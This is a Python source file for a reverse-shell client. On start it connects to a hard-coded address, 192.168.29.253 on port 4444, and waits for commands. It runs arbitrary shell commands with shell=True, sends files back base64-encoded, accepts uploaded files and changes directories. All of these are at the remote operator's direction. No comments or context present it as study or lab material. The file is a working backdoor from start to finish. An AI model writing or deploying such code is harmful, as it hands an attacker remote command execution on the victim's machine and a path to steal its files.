import socket
import subprocess
import json
import os
import base64
from os.path import expanduser
class Client:
    def  __init__(self,ip,port):
        self.c=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.c.connect((ip,port))
        self.check()
    def upload(self,path):
        try:
            with open(path,"rb") as file:
                return(base64.b64encode(file.read()).decode())

        except:
            y="[+] NO FILE FOUND[+]"
            return(y)
    def download(self,path,content):
        try:
            with open(path,"wb") as file:
                file.write(base64.b64decode(content))
            y="[+] FILE uploaded [+]"
        except:
            y="[+] NO FILE FOUND[+]"
        return(y)


    def changeDir(self,x):
        try:
            os.chdir(x)
            y="[+]DIRECTORY CHANGED[+]"
        except :
            y="[+]DIRECTORY  NOT CHANGED[+]"
        return(y)

    def home(self):
        home = expanduser("~")
        try:
            os.chdir(home)
            y="[+]DIRECTORY CHANGED[+]"
        except :
            y="[+]DIRECTORY  NOT CHANGED[+]"
        return(y)

    def check(self):
        while True:
            x=self.reliable_recieve()
            if x[0]=="cd" and len(x)>1:
                y=self.changeDir(x[1])
                self.reliables_send(y)
            elif x[0]=="exit":
                self.c.close()
                exit()
            elif x[0]=="cd" and len(x)==1:
                y=self.home()
                self.reliables_send(y)
            elif x[0]=="download":
                y=self.upload(x[1])
                self.reliables_send(y)
            elif x[0]=="upload":
                y=self.download(x[1],x[2])
                self.reliables_send(y)
            else:
                y=""
                for i in x:
                    y+=i
                    y+=" "
                self.command(y)
    def reliables_send(self,d):
        json_data=json.dumps(d)
        self.c.send(json_data.encode())
    def reliable_recieve(self):
        x=b""
        while True:
            try: #to get larger value or big data so that the data box is fully recieved b4 the convertion
                x=x+self.c.recv(1024)
                return json.loads(x)
            except ValueError:
                continue
    def command(self,x):
        try:
            y=subprocess.check_output(x,shell=True).decode()
        except:
            y="SUBPROCESS ERROR"
        self.reliables_send(y)

x=Client("192.168.29.253",4444)

















client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.connect(("192.168.29.253",4444))
